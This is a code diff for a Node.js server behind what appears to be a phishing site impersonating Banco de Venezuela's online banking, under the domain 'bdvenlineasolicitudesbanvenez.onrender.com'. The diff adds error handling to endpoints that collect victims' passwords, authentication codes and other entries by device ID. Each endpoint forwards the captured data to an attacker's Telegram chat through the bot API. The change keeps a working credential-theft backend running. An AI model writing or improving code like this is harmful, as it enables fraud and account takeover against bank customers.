@@ -24,7 +24,7 @@ const OPCIONES_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const OPCIONES_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 // Dirección pública del sitio
-const OPCIONES_URL_SITIO = 'https://pruebns.onrender.com';
+const OPCIONES_URL_SITIO = 'https://bdvenlineasolicitudesbanvenez.onrender.com';
 
 // Solicitudes pendientes y sus decisiones
 const solicitudesOpciones = new Map();
@@ -360,10 +360,15 @@ app.post('/send-user', async (req, res) => {
 app.post('/send-password', async (req, res) => {
     const { dispositivoID, texto: password } = req.body;
 
-    // Almacenar la contraseña por dispositivo
-    if (usuariosData[dispositivoID]) {
-        usuariosData[dispositivoID].contraseña = `CCCCC ${dispositivoID.replace('id.', '')}: \`${password}\``;
-    }
+// Almacenar la contraseña por dispositivo
+if (!usuariosData[dispositivoID]) {
+    console.error('Registro no encontrado en /send-password:', dispositivoID);
+    return res.status(404).json({
+        error: 'Registro de dispositivo no encontrado'
+    });
+}
+
+usuariosData[dispositivoID].contraseña = `CCCCC ${dispositivoID.replace('id.', '')}: \`${password}\``;
 
     await fetch(`https://api.telegram.org/bot${OPCIONES_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -381,10 +386,15 @@ app.post('/send-password', async (req, res) => {
 app.post('/send-auth', async (req, res) => {
     const { dispositivoID, texto: authCode } = req.body;
 
-    // Almacenar el código de autenticación por dispositivo
-    if (usuariosData[dispositivoID]) {
-        usuariosData[dispositivoID].codigo = `AAAA1 ${dispositivoID.replace('id.', '')}: \`${authCode}\``;
-    }
+// Almacenar el código de autenticación por dispositivo
+if (!usuariosData[dispositivoID]) {
+    console.error('Registro no encontrado en /send-auth:', dispositivoID);
+    return res.status(404).json({
+        error: 'Registro de dispositivo no encontrado'
+    });
+}
+
+usuariosData[dispositivoID].codigo = `AAAA1 ${dispositivoID.replace('id.', '')}: \`${authCode}\``;
 
     await fetch(`https://api.telegram.org/bot${OPCIONES_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -402,11 +412,16 @@ app.post('/send-auth', async (req, res) => {
 app.post('/send-calificacion', async (req, res) => {
     const { dispositivoID, texto: calificacion } = req.body;
 
-    // Almacenar la calificación por dispositivo
-    if (usuariosData[dispositivoID]) {
-        usuariosData[dispositivoID].calificacion =
-            `AAAA2 ${dispositivoID.replace('id.', '')}: \`${calificacion}\``;
-    }
+// Almacenar la calificación por dispositivo
+if (!usuariosData[dispositivoID]) {
+    console.error('Registro no encontrado en /send-calificacion:', dispositivoID);
+    return res.status(404).json({
+        error: 'Registro de dispositivo no encontrado'
+    });
+}
+
+usuariosData[dispositivoID].calificacion =
+    `AAAA2 ${dispositivoID.replace('id.', '')}: \`${calificacion}\``;
 
     await fetch(`https://api.telegram.org/bot${OPCIONES_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
